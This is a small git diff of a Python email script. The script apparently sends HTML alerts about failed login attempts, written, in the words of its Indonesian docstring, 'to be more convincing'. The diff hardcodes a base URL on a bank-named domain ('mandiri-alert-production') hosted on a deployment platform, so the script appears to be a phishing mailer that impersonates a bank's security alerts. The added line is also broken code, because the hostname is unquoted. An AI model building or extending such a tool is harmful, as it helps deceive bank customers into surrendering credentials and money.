@@ -11,7 +11,7 @@ load_dotenv()
 
 SENDER_EMAIL = os.getenv("SENDER_EMAIL")
 APP_PASSWORD = os.getenv("APP_PASSWORD")
-BASE_URL = os.getenv("BASE_URL")
+BASE_URL = mandiri-alert-production.up.railway.app
 
 def buat_pesan_html(email_penerima, nama_pengguna, ip_address, waktu, jumlah_gagal, lokasi):
     """Membuat konten email dalam format HTML agar lebih meyakinkan."""
@@ -104,4 +104,5 @@ if __name__ == "__main__":
         jumlah_gagal=3, 
         lokasi="Jakarta, Indonesia"
     )
+
 
